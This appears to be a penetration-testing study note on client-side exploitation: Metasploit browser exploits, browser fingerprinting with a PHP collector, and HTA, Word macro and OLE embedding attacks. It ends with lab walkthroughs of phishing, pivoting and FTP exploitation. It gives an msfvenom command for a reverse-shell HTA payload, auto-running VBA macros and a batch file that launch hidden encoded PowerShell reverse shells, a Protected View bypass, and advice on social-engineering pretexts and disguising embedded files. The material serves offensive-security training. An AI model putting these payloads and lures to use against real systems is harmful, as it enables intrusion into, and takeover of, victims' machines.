# Client-Side Exploitation

--- 

- client-side exploitation involves exploiting the vulnerabilities found in client software, rather than server software, and do not rqeuire an attacker to have direct or routable access to the victim's machine
- specifically, a client-side exploit requires some type of user interaction (i.e. clicking a link, opening a file, etc.), thus client-exploits target installed applications, such as browsers, browser plugins, email client, etc. 
- depending on the exploit, the user interaction and the attack configuration may change 
- as an example, the Metasploit module `firefox_pdfjs_privilege_escalation` can execute arbitrary code by abusing a flaw existing  in the way Firefox handles documents loaded through the `resource: URL` by exploiting the *Mozilla PDF.js* PDF file viewer 
	- first, select and configure the module: `use exploit/multi/browser/firefox_pdfjs_privilege_escalation` -> `options` -> [set optoins] -> `set paylaod firefox/shell_reverse_tcp` -> `exploit`
		- Metasploit will start a web server which hosts a web page containing the exploit itself, all you need to do this lure the victim into opening the address 
	- once a user visits the web page, a shell on the target machine will be instantiated within the Metasploit session 

<br>

### Client-Side Enumeration

Passive client information gathering:
> Search social media site, in photos, or on forum websites for inforamtion that may reveal what OS, browser versions/plugins, application versions, anti-virus applications in use, or other software a target may be using.

Active client information gathering (social engineering):
> Make direct contact with the client (i.e. a phone call, a targeted email, etc.) which is designed to enumerate the software/applications a client is using. Make sure social engineering pretexts are intricate and specific, based on the information you have gathered in advance, to give the best chance for success.

> Targeting a user's web browser is generally a good vector for collecting information as their evolution, complexity, and richness in functionality provides a wealth of information to be mined.

Finger-printing a web browser with *Fingerprintjs2*:
- a) download the Fingerprintjs2 JavaScript library
- b) incorporate the library into a HTML file and use the library to fingerprint browsers which visit the webpage: 
	```html
	<!doctype html>
	<html>
	<head>
		<title>Fingerprintjs2 test</title>
	</head>
	<body>
		<h1>Fingerprintjs2</h1>
		<p>Your browser fingerprint: <strong id="fp"></strong></p>
		<p><code id="time"/></p>
		<p><span id="details"/></p>
		<script src="fingerprint2.js"></script>
		<script>
			var d1 = new Date();
			var options = {};
			Fingerprint2.get(options, function (components) {
			var values = components.map(function (component) { return component.value })
			var murmur = Fingerprint2.x64hash128(values.join(''), 31)
			var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
			var d2 = new Date();
			var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
			var details = "Detailed information: \n";
			if(typeof window.console !== "undefined") {
				for (var index in components) {
					var obj = components[index];
					var value = obj.value;
					if (value !== null) {
						var line = obj.key + " = " + value.toString().substr(0, 150);
						details += line + "\n";
					}
				}
			}
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.open("POST", "/fp/js.php");
			xmlhttp.setRequestHeader("Content-Type", "application/txt");
			xmlhttp.send(clientfp + timeString + details);
		</script>
	</body>
	</html>
	```
	- this JS code creates a unique hash fingerprint of the web browser, and extracts and displays the values collected in a HTML webpage to reveal the User Agent, localization, installed plugins, generic inforamtion regarding the underlying OS platform, and other details
	- this unique User Agent string can be submitted to an online user agent database to identify the browser version and OS (i.e. `https//devlopers.whatismybrowser.com`)
- the code sends the output string to `js.php` via a POST request:
	```php
	<?php
	$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
	$data .= file_get_contents('php://input');
	$data .= "---------------------------------\n\n";
	file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true),
	FILE_APPEND | LOCK_EX);
	?>
	```
	- this PHP code extracts teh client IP address, and execution environment information, and writes it to the `fingerprint.txt` file in the `/var/www/html/fp` directory
- the attacker can then view this file to see the relevant browser information to formulate a client-side attack 
	

<br>

### Leveraging HTML Applications

> If a file is created with the extension of `.hta` instead of `.html`, Internet Explorer will automatically interpret it as am HTML application and offer the ability to execute it using the `mshta.exe` program. This allows an attacker to execute arbitrary code with that user's permissions, avoiding security restrictions normally imposed by Internet Explorer. This attack only works against Internet Explorer, but is still useful given many corporations rely on IE as their main browser 

> HTML applications use html, body, and script tags with JS or VBScript code. However, sine they execute outside of the browser, they can also use legacy and dangerous features that are often blocked within the browser. 

ActiveXObjects:
- these can provide access to underlying OS commands through the Windows Script Host functionality or WScript and in particular the Windows Script Host Shell object
- once you instantiate a Windows Script Host Shell object, you can invoke it's *run* method to launch the application on the target client machine 
- i.e. a PoC HTML application that launches a command prompt:
	```html
	<html>
	<head>
	<script>
	
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
	
	</script>
	</head>
	<body>
	<script>
	
	self.close();
	
	</script>
	</body>
	</html>
	```
	- when a client clicks on this file using Internet Explorer, they will asked if they want to open it and allow the application to run
	- if they select Allow, the JS code will run and launch the `cmd.exe` program
	- the second `self.close();` JS code is used to prevent `mshta.exe` from keeping open an additional window behind the command prompt

HTA Attack in Action:
- `msfvenom` can be used to turn the above HTML application into an attack, using the *hta-psh* output format to create an HTA payload based on PowerShell
- i.e. `sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f
hta-psh -o /var/www/html/evil.hta`
- this HTA application (`evil.hta`) can be hosted on the attack machine and a netcat listener can be launched (`nc -lvnp 4444`)
- when a victim browsers to this malicious URL, and accepts the two security warnings, the netcat listener will catch the reverse shell and the attacker will have a PowerShell on the target system

<br>

### Exploiting Microsoft Office

> Microsoft Office client-side attacks are often successful because it is difficult to differentiate malicious content from benign. 

Microsoft Word Macro:
> This is the oldest and best-known client-side software attack vector. Microsoft Office applications, like Word and Excel, allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Macros can be written fro scratch in Visual Basic for Application (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

- a) create a macro by choosing the VIEW ribbon and selecting Macros 
- b) next, enter VBA code to generate the macro
- note, the document must be saves as either `.docm` or `.doc`, but not `.docx` as this format does not support macros 
- also, a security warning about macros will be disabled which requires the user to Enable Content to run the macro, thus this must be overcome by the pretext of the attack
- i.e. a Sub (similar to a function) that runs the cmd.exe program via the Windows Scripting Host through ActiveX
	```vba
	Sub MyMacro()
		CreateObject("Wscript.shell").Run "cmd"
	End Sub
	```
- i.e. to execute the macro automatically define AutoOpen and Document_Open procedures:
	```vba
	Sub AutoOpen()
		MyMacro
	End Sub
	
	Sub Document_Open()
		MyMacro
	End Sub
	
	Sub MyMacro()
		CreateObject("Wscript.shell").Run "cmd"
	End Sub
	```
- i.e. to create a PowerShell reverse shell
	```vba
	Sub AutoOpen()
		MyMacro
	End Sub
	
	Sub Document_Open()
		MyMacro
	End Sub
	
	Sub MyMacro()
		Dim Str as String 
		
		Str = "powershell.exe -nop -w hidden -e <payload-part1>"
		Str = Str + "<payload-part2>"
		Str = Str + "<payload-part3>"
		...
			
		CreateObject("Wscript.shell").Run Str
	End Sub
	```
	- a string (Str) variable is created to hold the PowerShell reverse shell (base64 encoded), generated by `msfvenom` and split into 50 character chunks (there is a  255-character limit for string literals in VBA)
	- this variable is then executed by the Wscript Run function to create the reverse shell which will connect back to a netcat listener (`nc -lvnp 4444`)

Object Linking and Embedding:
> You can abuse Microsoft Office's document-embedding feature to trick a victim into running a Windows batch file which executes an application

- a) create a malicious batch file 
	- i.e. to launch cmd.exe:`START cmd.exe`
- b) include the file in a Microsoft Word document -> open Word, create a new Document, navigate to the Insert ribbon, click the Object menu, then choose the Create from File tab and select the newly-created batch script (i.e. launch.bat)
- c) change the appearance of the batch file within the Word document to make it look more benign -> check the Display as icon checkbox and select Change Icon to bring up a dialog box where you can change the Icon and Caption of the file 
- d) next, trick the victim into double-clicking the icon and accepting the security warning so that the batch script runs 
- i.e. to create a PowerShell reverse shell:
	```batch
	START powershell.exe -nop -w hidden -e <base64_encoded_payload>
	```
	- again you can create a base64 encoded PowerShell reverse shell payload with `msfvenom` and have this execute to gain a reverse shell on the target machine, caught by a netcat listener

Protected View:
> When served over the Internet, through an email or a download link, you must bypass Protected View -- a layer of protection that disables all editing and modifications in the document and blocks the execution of macros or embedded objects. Protected View generates another security warning the victim must accept so it is best to try and avoid this 

> One way to avoid Protected View is to use the Microsoft Publisher application which allows embedded objects and code execution in the same manner as Word and Excel, but will not enable Protected View for Internet-delivered documents. However, Publisher is less frequently installed than Word or Excel.




<br>

### Examples

Example #1: 
- first select the module to use: `use exploit/multi/browser/adobe_flash_hacking_team_uaf` 
- to view information about the module: `info` (the victim must open a specific link to use this exploit)
- use `options` to view configurations to set -> [configure options]
- to view targets use: `show targets` -> select target to use `set target <target_number>`
- to view payloads you can set for this target: `set paylaod <tab><tab>` -> `set payload <payload_name>` -> run `options` again to see the specific payload options you need to set -> [configure options]
- enter `run` to run the exploit -- this will generate a URL which you have to lure the target into visiting 
- once the victim clicks on the link (visits the URL) the exploit will run and the payload selected will be run on the target system -- a Metasploit session will be created which you can interact with using: `sessions` -> `session <session_number>`
- the module will keep running (which you can view using the `jobs` command) so if anyone else connects to it (visits the URL) then they will generate another Metasploit session -- you can kill the job with `jobs -k <job_number>`

<br>

Example #2:
- Task 1: Find a way into the network 
	- you only have the internal IP addresses and they are not directly reachable from the Internet, so you need to use a client-side attack to get access to employee machines
	- select an exploit:
		- `msfconsole` -> `search java_jre17_exec` -> `use 0` -> set SRVHOST and LHOST to your IP, set URIPATH, set TARGET to 1, set LPORT to 443, and set PAYLOAD to windows/meterpreter/reverse_tcp -> `run`
		- get the link
	- send the exploit:
		- in web client send the link generated to a corporate email address and wait for a connection
- Task 2: Post-Exploitation
	- use post-exploitation commands to find the address of a server in the DMZ
		- `sessions -i 1` (to interact with meterpreter session created) -> `ifconfig` (to find adapaters) and `route` (to find routes) -> `netstat` (to view network connections) 
		- found: FTP (21) connection and POP3 connection (110)
- Task 3: Pivoting 
	- use a pivoting technique to reach the server in the DMZ
		- in meterpreter: `run autoroute -s 10.10.51.0/24` -> background 
		- `use auxiliary/server/socks_proxy` -> set version to 4a -> `run
		- edit `/etc/proxychains.conf` file to: `socks4	127.0.0.1	1080`
		- verify it worked from a terminal: `proxychains ftp 10.10.51.21`
- Task 4: Verify the server version 
	- run an nmap scan on the server to discover the FTP version
		- `proxychains nmap -sTV -n -PN -p 21 10.10.51.21`
- Task 5: Exploit the server:
	- exploit the vulnerable FTP service running
		- in metasploit: `search ftp 1.3.2a` -> `use 0` -> [set options] -> `run`